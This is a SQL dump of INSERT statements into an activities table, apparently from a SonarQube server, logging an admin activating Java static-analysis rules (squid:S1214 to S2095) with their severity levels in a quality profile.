INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (956, '2017-11-20 07:41:39.512', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1214;ruleKey=squid:S1214;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCE4bbGRdfPp-qsf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (957, '2017-11-20 07:41:39.559', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1215;ruleKey=squid:S1215;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCFnbbGRdfPp-qsg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (958, '2017-11-20 07:41:39.597', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1217;ruleKey=squid:S1217;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCGNbbGRdfPp-qsh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (959, '2017-11-20 07:41:39.636', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1219;ruleKey=squid:S1219;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCG0bbGRdfPp-qsi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (960, '2017-11-20 07:41:39.664', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1220;ruleKey=squid:S1220;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCHQbbGRdfPp-qsj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (961, '2017-11-20 07:41:39.702', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1221;ruleKey=squid:S1221;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCH2bbGRdfPp-qsk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (962, '2017-11-20 07:41:39.739', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1223;ruleKey=squid:S1223;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCIbbbGRdfPp-qsl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (963, '2017-11-20 07:41:39.798', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1226;ruleKey=squid:S1226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCJWbbGRdfPp-qsm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (964, '2017-11-20 07:41:39.899', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1264;ruleKey=squid:S1264;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCK7bbGRdfPp-qsn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (965, '2017-11-20 07:41:39.999', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S128;ruleKey=squid:S128;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCMfbbGRdfPp-qso');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (966, '2017-11-20 07:41:40.069', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1301;ruleKey=squid:S1301;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCNlbbGRdfPp-qsp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (967, '2017-11-20 07:41:40.107', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1313;ruleKey=squid:S1313;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCOLbbGRdfPp-qsq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (968, '2017-11-20 07:41:40.15', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1317;ruleKey=squid:S1317;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCO2bbGRdfPp-qsr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (969, '2017-11-20 07:41:40.188', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1319;ruleKey=squid:S1319;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCPcbbGRdfPp-qss');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (970, '2017-11-20 07:41:40.211', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S135;ruleKey=squid:S135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCPzbbGRdfPp-qst');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (971, '2017-11-20 07:41:40.251', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1444;ruleKey=squid:S1444;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCQbbbGRdfPp-qsu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (972, '2017-11-20 07:41:40.29', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1450;ruleKey=squid:S1450;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCRCbbGRdfPp-qsv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (973, '2017-11-20 07:41:40.317', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1452;ruleKey=squid:S1452;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCRdbbGRdfPp-qsw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (974, '2017-11-20 07:41:40.357', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1479;ruleKey=squid:S1479;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;param_maximum=30;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCSFbbGRdfPp-qsx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (975, '2017-11-20 07:41:40.4', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1481;ruleKey=squid:S1481;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCSwbbGRdfPp-qsy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (976, '2017-11-20 07:41:40.44', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1488;ruleKey=squid:S1488;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCTYbbGRdfPp-qsz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (977, '2017-11-20 07:41:40.481', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1596;ruleKey=squid:S1596;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCUBbbGRdfPp-qs0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (978, '2017-11-20 07:41:40.52', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1598;ruleKey=squid:S1598;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCUobbGRdfPp-qs1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (979, '2017-11-20 07:41:40.588', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1602;ruleKey=squid:S1602;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCVsbbGRdfPp-qs2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (980, '2017-11-20 07:41:40.629', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1604;ruleKey=squid:S1604;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCWVbbGRdfPp-qs3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (981, '2017-11-20 07:41:40.667', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1607;ruleKey=squid:S1607;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCW7bbGRdfPp-qs4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (982, '2017-11-20 07:41:40.705', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1610;ruleKey=squid:S1610;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCXhbbGRdfPp-qs5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (983, '2017-11-20 07:41:40.746', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1611;ruleKey=squid:S1611;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCYKbbGRdfPp-qs6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (984, '2017-11-20 07:41:40.791', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1612;ruleKey=squid:S1612;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCY3bbGRdfPp-qs7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (985, '2017-11-20 07:41:40.864', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1640;ruleKey=squid:S1640;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCaAbbGRdfPp-qs8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (986, '2017-11-20 07:41:40.937', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1643;ruleKey=squid:S1643;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCbJbbGRdfPp-qs9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (987, '2017-11-20 07:41:41.036', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1656;ruleKey=squid:S1656;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCcsbbGRdfPp-qs-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (988, '2017-11-20 07:41:41.098', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1659;ruleKey=squid:S1659;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCdqbbGRdfPp-qs_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (989, '2017-11-20 07:41:41.135', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1700;ruleKey=squid:S1700;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCePbbGRdfPp-qtA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (990, '2017-11-20 07:41:41.173', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1710;ruleKey=squid:S1710;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCe1bbGRdfPp-qtB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (991, '2017-11-20 07:41:41.213', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1751;ruleKey=squid:S1751;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCfdbbGRdfPp-qtC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (992, '2017-11-20 07:41:41.255', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1764;ruleKey=squid:S1764;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCgHbbGRdfPp-qtD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (993, '2017-11-20 07:41:41.285', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1844;ruleKey=squid:S1844;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCglbbGRdfPp-qtE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (994, '2017-11-20 07:41:41.357', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1845;ruleKey=squid:S1845;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYChtbbGRdfPp-qtF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (995, '2017-11-20 07:41:41.397', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1849;ruleKey=squid:S1849;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCiVbbGRdfPp-qtG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (996, '2017-11-20 07:41:41.436', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1854;ruleKey=squid:S1854;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCi8bbGRdfPp-qtH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (997, '2017-11-20 07:41:41.474', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1858;ruleKey=squid:S1858;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCjibbGRdfPp-qtI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (998, '2017-11-20 07:41:41.516', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1860;ruleKey=squid:S1860;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCkMbbGRdfPp-qtJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (999, '2017-11-20 07:41:41.543', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1862;ruleKey=squid:S1862;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCknbbGRdfPp-qtK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1000, '2017-11-20 07:41:41.58', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1871;ruleKey=squid:S1871;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYClMbbGRdfPp-qtL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1001, '2017-11-20 07:41:41.619', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1872;ruleKey=squid:S1872;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYClzbbGRdfPp-qtM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1002, '2017-11-20 07:41:41.66', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1905;ruleKey=squid:S1905;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCmcbbGRdfPp-qtN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1003, '2017-11-20 07:41:41.698', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1940;ruleKey=squid:S1940;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCnCbbGRdfPp-qtO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1004, '2017-11-20 07:41:41.74', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1948;ruleKey=squid:S1948;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCnsbbGRdfPp-qtP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1005, '2017-11-20 07:41:41.792', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1989;ruleKey=squid:S1989;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCogbbGRdfPp-qtQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1006, '2017-11-20 07:41:41.856', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1994;ruleKey=squid:S1994;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCpgbbGRdfPp-qtR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1007, '2017-11-20 07:41:41.909', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2055;ruleKey=squid:S2055;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCqVbbGRdfPp-qtS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1008, '2017-11-20 07:41:41.991', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2060;ruleKey=squid:S2060;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCrnbbGRdfPp-qtT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1009, '2017-11-20 07:41:42.029', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2061;ruleKey=squid:S2061;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCsNbbGRdfPp-qtU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1010, '2017-11-20 07:41:42.069', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2062;ruleKey=squid:S2062;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCs1bbGRdfPp-qtV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1011, '2017-11-20 07:41:42.128', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2065;ruleKey=squid:S2065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCtwbbGRdfPp-qtW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1012, '2017-11-20 07:41:42.169', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2066;ruleKey=squid:S2066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCuZbbGRdfPp-qtX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1013, '2017-11-20 07:41:42.211', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2068;ruleKey=squid:S2068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCvDbbGRdfPp-qtY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1014, '2017-11-20 07:41:42.249', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2077;ruleKey=squid:S2077;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCvpbbGRdfPp-qtZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1015, '2017-11-20 07:41:42.305', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2092;ruleKey=squid:S2092;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCwhbbGRdfPp-qta');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1016, '2017-11-20 07:41:42.343', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2093;ruleKey=squid:S2093;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCxHbbGRdfPp-qtb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1017, '2017-11-20 07:41:42.378', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2094;ruleKey=squid:S2094;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCxqbbGRdfPp-qtc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1018, '2017-11-20 07:41:42.415', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2095;ruleKey=squid:S2095;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;param_excludedResourceTypes=;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCyPbbGRdfPp-qtd');
